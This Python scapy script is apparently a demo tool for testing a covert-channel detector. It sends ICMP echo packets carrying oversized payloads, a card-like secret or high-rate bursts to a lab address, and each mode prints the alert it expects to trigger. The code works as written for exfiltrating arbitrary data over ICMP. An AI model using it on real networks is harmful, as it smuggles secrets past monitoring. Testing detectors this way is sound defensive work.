from __future__ import annotations

import argparse
import time

from scapy.layers.inet import ICMP, IP
from scapy.packet import Raw
from scapy.sendrecv import send

from ui.display import (
    BurstProgressTracker,
    print_hint,
    print_status,
    print_success,
    render_attack_banner,
    render_payload_telemetry,
)

DEFAULT_TARGET = "172.21.0.10"
WINDOWS_BENIGN_PAYLOAD = b"abcdefghijklmnopqrstuvwabcdefghi"


def send_oversized(target: str, data: str) -> None:
    """Executes the oversized payload bulk dump attack."""
    render_attack_banner(
        target=target,
        scenario_mode="Oversized Frame Exfiltration",
        scenario_description="Transmit bulky bulk payload exceeding OS threshold (>64B)",
        expected_alert_identifier="icmp_oversized_payload (HIGH severity)",
    )

    payload = data.encode("utf-8")
    render_payload_telemetry(payload, panel_title="Forged Jumbo ICMP Payload")

    print_status("Injecting crafted frame onto network stack...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print_success(f"1 Frame dispatched to [yellow]{target}[/].")
    print_hint("Observe 'covert-detector' logs for structural alert trigger.")


def send_sensitive(target: str, data: str) -> None:
    """Executes the cleartext sensitive data exfiltration scenario."""
    render_attack_banner(
        target=target,
        scenario_mode="Sensitive Cleartext Exfiltration",
        scenario_description="Hide unencrypted PCI-DSS/API secret inside ICMP Echo Request",
        expected_alert_identifier="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
    )

    payload = data.encode("utf-8")
    render_payload_telemetry(payload, panel_title="Exfiltrated Secret in Echo Payload")

    print_status("Injecting packet through gateway...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print_success("Packet dispatched with embedded secret.")
    print_hint("Observe 'covert-detector' logs for L7 keyword/Luhn detection.")


def send_burst(target: str, count: int, delay: float) -> None:
    """Executes a high-frequency packet burst to test behavioral heuristics."""
    render_attack_banner(
        target=target,
        scenario_mode="High-Frequency Burst Flooding",
        scenario_description=f"Rapidly dispatch {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
        expected_alert_identifier="icmp_high_frequency (Rate Limiting heuristic)",
    )

    with BurstProgressTracker(total_packet_count=count, task_description="Burst Stream") as tracker:
        for seq in range(count):
            payload = WINDOWS_BENIGN_PAYLOAD
            pkt = IP(dst=target) / ICMP(type=8, seq=seq) / Raw(load=payload)
            send(pkt, verbose=False)
            tracker.step(packet_sequence_index=seq, payload_size_in_bytes=len(payload))
            time.sleep(delay)

    print_success(f"Burst sequence concluded ({count} packets sent in {count * delay:.2f}s).")
    print_hint(
        "Observe 'covert-detector' logs: packets 1-4 pass, packet 5+ triggers rate limit."
    )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Live-Demo ICMP Covert Channel Exfiltration Tool"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Destination sink IP")
    parser.add_argument(
        "--mode",
        choices=["oversized", "sensitive", "burst"],
        required=True,
        help="Attack scenario to execute",
    )
    parser.add_argument(
        "--data", default="", help="Custom string or secret to transmit"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=6,
        help="Number of packets for burst mode (default: 6)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Interval between packets in burst mode (seconds, default: 0.05)",
    )

    args = parser.parse_args()

    if args.mode == "oversized":
        default_data = "CONFIDENTIAL_FINANCIAL_REPORT_LEAK_" + ("X" * 70)
        send_oversized(args.target, args.data or default_data)
    elif args.mode == "sensitive":
        default_data = "4532015112830366"
        send_sensitive(args.target, args.data or default_data)
    elif args.mode == "burst":
        send_burst(args.target, count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()